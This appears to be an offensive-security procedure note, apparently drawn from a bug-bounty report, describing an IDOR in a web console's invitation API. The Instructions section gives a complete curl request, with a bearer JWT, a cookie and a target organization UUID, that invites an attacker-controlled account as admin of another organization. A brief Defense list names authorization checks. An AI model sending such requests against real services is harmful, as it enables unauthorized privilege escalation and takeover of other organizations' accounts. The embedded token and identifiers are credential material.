---
id: proc-modify-invitation-idor
tags:
  - idor
  - burp-suite
  - invitation
  - privilege-escalation
type: procedure
tools:
  - '[[tools/burp-suite]]'
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/post-invitation-modified]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploitation for Privilege Escalation]]'
updated_at: '2025-12-14T17:32:20.906Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Exploitation for Privilege Escalation]]'
---
# Modify and Resend Invitation to Target Organization

## Summary

This procedure exploits the IDOR in /api/invitations by modifying the intercepted request's organization ID to the target UUID, inviting a fake account as admin and bypassing authorization checks.

## Description

The endpoint lacks validation that the requester is an admin of the specified organization, allowing any authenticated user to invite to any org if the ID is known. Using Burp Suite, alter the JSON body and forward the request to add the controlled fake account as admin, enabling further escalation.

## Requirements

1. Intercepted legitimate request from previous procedure
2. Leaked target org ID (e.g., cb23000e-65b3-4628-9ede-656ffa0d5aa8)
3. Burp Suite with Repeater or Proxy
4. Same JWT and cookies as original request

## Defense

Defensive measures and detection strategies:

- Add server-side authorization checks for organization membership and admin role on invitations
- Validate organization ID against user's affiliations
- Audit invitation logs for mismatched org/user pairs

## Objectives

1. Invite fake account to unauthorized target org
2. Confirm admin role assignment
3. Enable privilege escalation chain

## Instructions

### Step 1: Modify Request in Burp Suite

**Context**: In Burp's Repeater or Proxy, change the organization field to the target ID and forward.

**Command** ([[commands/post-invitation-modified]]):
```bash
curl -X POST https://console.helium.com/api/invitations \
  -H "Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTg1NzAyODgzLCJpYXQiOjE1ODU2MTY0ODMsImlzcyI6ImNvbnNvbGUiLCJqdGkiOiIwNjUwMGRiOS1kNjNlLTRiYTQtYWJiYy0xYmQ0YTViMzUxY2YiLCJuYmYiOjE1ODU2MTY0ODIsIm9yZ2FuaXphdGlvbiI6Ijg4M2IwYTQ2LWU0Y2YtNDMxNS1hZjRmLTQyMjZkMWFkYTU2MSIsIm9yZ2FuaXphdGlvbl9uYW1lIjoibG9sIiwic3ViIjoiOGY1YWJlMTktMDAwMS00MWI1LWE5NjktZmUwYjcxZGNjZjFmIiwidHlwIjoiYWNjZXNzIiwidXNlciI6IjhmNWFiZTE5LTAwMDEtNDFiNS1hOTY5LWZlMGI3MWRjY2YxZiJ9.VMAi-07cZkCJg-dffHdR1wwJbi9JNSzpaQSRSQGDX-_vDrcTOPEfgJU_LCZ8H5tYiwsexyD-ogLFakGY1bFy-A" \
  -H "Content-Type: application/json" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" \
  -H "Cookie: _ga=GA1.2.356414044.1583245182; ..." \
  -d '{"invitation":{"email":"azraelsec+1@wearehackerone.com","role":"admin","organization":"cb23000e-65b3-4628-9ede-656ffa0d5aa8"}}'
```

> Forward the modified request in Burp. Expected 201 response confirms success.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]]

### Techniques

- [[Exploitation for Privilege Escalation]]

### Sub-Techniques


## Commands Used

- [[commands/post-invitation-modified]]

## Tools Used

- [[tools/burp-suite]]

## Tags

- idor
- burp-suite
- invitation
- privilege-escalation
